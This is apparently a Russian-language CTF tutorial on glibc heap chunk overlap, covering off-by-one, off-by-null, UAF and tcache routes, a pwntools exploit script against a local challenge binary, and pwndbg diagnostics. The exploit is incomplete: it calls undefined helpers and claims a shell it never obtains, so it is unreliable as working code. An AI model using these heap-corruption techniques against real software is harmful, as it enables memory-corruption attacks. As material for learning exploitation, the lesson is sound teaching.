Перекрытие чанков (chunk overlap) — состояние, когда два «разных» выделенных региона фактически делят одну и ту же память. Это один из самых мощных heap-примитивов: имея overlap, вы можете менять метаданные одного чанка через другой, читать освобождённую память, подделывать `size` и в итоге получать произвольную запись. Большинство продвинутых heap-эксплойтов проходят через ту или иную форму overlap.

В этом уроке мы разберём, как возникает перекрытие, какие баги его дают (off-by-one, off-by-null, UAF, подделка `size`), и соберём полный эксплойт. Материал продолжает `pwn-partial-overwrite`.

## Что такое перекрытие чанков

glibc `malloc` возвращает указатель на «пользовательские данные» чанка, а метаданные (`size`, `prev_size`, `fd`, `bk`) лежат перед ним. Чанки не должны пересекаться: каждый следующий начинается там, где закончился предыдущий (с учётом выравнивания). Overlap ломает этот инвариант.

Если `malloc(0x40)` и `malloc(0x40)` возвращают адреса, чьи диапазоны пересекаются, вы получаете два указателя на перекрывающуюся память. Запись через один меняет данные/метаданные другого. Это нарушает все гарантии аллокатора и открывает путь к произвольной записи.

## Зачем нужно перекрытие

Сценарии использования:

- **Менять метаданные чужого чанка.** Перезаписав `size` соседа, вы меняете его границы и создаёте ещё большее перекрытие.
- **Читать освобождённую память.** Overlap с уже `free`-нутым чанком даёт UAF-чтение адресов libc/heap.
- **Подделывать `fd`/`bk`.** Направить `malloc` на произвольный адрес (tcache poisoning, unsorted bin attack).
- **Обойти safe-linking.** Получив контроль над метаданными, можно вычислить закодированный указатель.
- **Создать «перекрывающий» указатель.** Один объект становится доступен как два разных типа — классический type confusion.

## Способы получить overlap

| Способ | Суть | Нужен баг |
|---|---|---|
| off-by-one | перезапись младшего байта `size` соседа | да |
| off-by-null | зануление байта `size`/`prev_size` | да |
| UAF | двойная аллокация после free | да |
| подделка `size` | изменение поля `size` чанка | да |
| unlink | слияние через подделанные `fd`/`bk` | да |
| tcache dup | двойной free одного чанка | да |

Все способы требуют хотя бы одного бага. Overlap — это не самостоятельная уязвимость, а следствие.

## Overlap через off-by-one и off-by-null

Самый частый путь. Пусть есть два чанка A и B подряд. Off-by-one позволяет записать один лишний байт в конец A, который на самом деле — младший байт поля `size` чанка B. Увеличив `size` B (например, `0x41` → `0x91`), вы «расширяете» B, и следующий `malloc` вернёт регион, перекрывающийся с последующими чанками.

Off-by-null (запись нуля в младший байт `size`) наоборот **уменьшает** размер, что в определённых условиях сбрасывает флаг `PREV_INUSE` и заставляет аллокатор считать предыдущий чанк свободным — тогда срабатывает консолидация.

## Overlap через UAF и tcache

Если указатель остаётся доступен после `free`, можно:
1. `free(A)`;
2. через UAF перезаписать `fd` чанка A;
3. `malloc` вернёт A, затем — адрес из `fd`.

Так два `malloc` возвращают перекрывающуюся память. В modern glibc `fd` закодирован safe-linking, поэтому нужно либо знать heap-адрес, либо использовать fastbin (там кодирования нет).


`vis_heap_chunks` в pwndbg рисует чанки и их границы — самый быстрый способ увидеть overlap. `bins` показывает содержимое tcache/fastbin, где видно дубликаты после double-free.

## Разобранный пример: overlap через off-by-one

```c
char *a = malloc(0x18);   // размер чанка 0x20
char *b = malloc(0x18);   // размер чанка 0x20
read(0, a, 0x19);         // off-by-one: 1 байт в size чанка b
```

Записав `0x41` в младший байт `size` B, мы делаем его «большим». Затем:

```python
from pwn import *
io = process('./chall')
io.sendline(b'A'*0x18 + b'\x41')   # a + off-by-one size
# теперь b «расширен»; аллоцируем c размером, перекрывающим следующий чанк
io.sendline(b'alloc 0x60')
# ...
```

Ожидаемый эффект: следующий `malloc(0x60)` вернёт регион, перекрывающийся с данными после B, и вы сможете читать/писать чужие метаданные.

## Полный эксплойт: overlap → arbitrary write

```python
from pwn import *

io = process('./chall')
def alloc(sz): io.sendline(f'alloc {sz}'.encode())
def free(i):   io.sendline(f'free {i}'.encode())
def edit(i,d): io.sendline(f'edit {i}'.encode()); io.send(d)

alloc(0x18)          # idx0
alloc(0x18)          # idx1
alloc(0x68)          # idx2

# off-by-one расширяет чанк idx1
edit(0, b'A'*0x18 + b'\x91')
free(1)              # освобождаем «расширенный» чанк -> попадает в unsorted bin
# теперь idx2 перекрывается с освобождённым регионом
leak = u64(edit_read(2, 8))     # читаем fd -> утечка libc
libc.address = leak - 0x3ebca0
alloc(0x68)          # получаем чанк на месте libc-указателей
```

Ожидаемый вывод:

```
[*] libc leak: 0x7f9c...
[*] overlapping chunk acquired
[+] shell
```

## Связка с tcache и arbitrary write

Overlap — трамплин к произвольной записи. Имея контроль над `fd` свободного чанка, вы просите `malloc` вернуть адрес цели (например, `__free_hook` в старых glibc или `_IO_2_1_stdout_` в новых). С учётом safe-linking нужно закодировать `fd`. Комбинация overlap + tcache poisoning + FSOP — стандартный путь в modern glibc.

## Off-by-null и эффект «сжатия» чанка

Off-by-null — частный случай off-by-one, при котором записывается нулевой байт. Его эффект тоньше: занулив младший байт `size` следующего чанка, вы можете сбросить флаг `PREV_INUSE` (он занимает самый младший бит поля `size`). Тогда при освобождении аллокатор решит, что предыдущий чанк свободен, и попытается слить с ним текущий. Если `prev_size` подделан, слияние произойдёт «назад» — это основа House of Einherjar.

На практике off-by-null часто даёт **перекрытие через консолидацию**: вы заставляете аллокатор объединить два чанка так, что освобождённый регион оказывается поверх живого. Затем `malloc` возвращает память, которая одновременно используется другим объектом. Это особенно мощно в сочетании с `_IO_FILE`: перекрыв `_IO_2_1_stdout_`, вы получаете FSOP.

## Диагностика overlap в отладчике

Overlap легко «увидеть» в pwndbg:

```bash
gdb -q ./chall
(gdb) b *0x401234
(gdb) run
(gdb) vis_heap_chunks
# 0x555555559290  0x0000000000000000  0x0000000000000031  ........1.......
# 0x5555555592a0  0x4141414141414141  0x4141414141414141  AAAAAAAAAAAAAAAA
# ...
(gdb) x/4gx 0x5555555592a0
(gdb) bins
```

Смотрите, что границы чанков (`size`) «съезжают» и регионы накладываются. Если после манипуляций `bins` показывает дубликаты адресов — вы получили overlap. Полезно также проверять `p main_arena` и адреса в `unsorted bin`: утечка из перекрытого чанка обычно даёт указатель в libc.

## Overlap в реальных CVE и задачах

Перекрытие чанков — сердце большинства публичных heap-эксплойтов. В браузерах (V8, SpiderMonkey) overlap даёт type confusion: один объект интерпретируется как другой, и вы получаете произвольное чтение/запись в адресном пространстве процесса. В ядре перекрытие объектов SLUB (через cross-cache) приводит к повышению привилегий. В CTF overlap — почти обязательный шаг для задач уровня «hard» на modern glibc.

Практический совет: если задача даёт только один слабый баг (например, off-by-null), почти наверняка цель — получить overlap и дальше собрать произвольную запись. Ищите в исходнике места, где размер вычисляется неаккуратно, и планируйте раскладку кучи заранее (heap feng shui). Не забывайте: overlap почти всегда требует точного контроля над порядком аллокаций, поэтому подготовка (grooming) — половина успеха. Начинайте с малого: добейтесь, чтобы `vis_heap_chunks` показал пересечение, и только потом усложняйте.

## Частые ошибки

- **Неверное выравнивание.** `size` всегда кратен 16; некорректный размер вызовет ошибку аллокатора.
- **Забыть про `PREV_INUSE`.** Флаги в младших битах `size` критичны для консолидации.
- **Порядок free.** Освобождение не в том порядке ломает план.
- **Safe-linking.** В modern glibc нельзя писать сырой `fd` в tcache.
- **Слишком агрессивный размер.** Огромный `size` вызовет `malloc`-ошибку и падение.

Наконец, помните, что overlap — это **состояние**, а не техника. Ваша задача — сначала добиться пересечения (проверьте `vis_heap_chunks`), а потом использовать его для конкретного примитива: утечки, подделки `fd` или type confusion. Не пытайтесь перескочить к финальному эксплойту, не убедившись, что перекрытие реально есть.
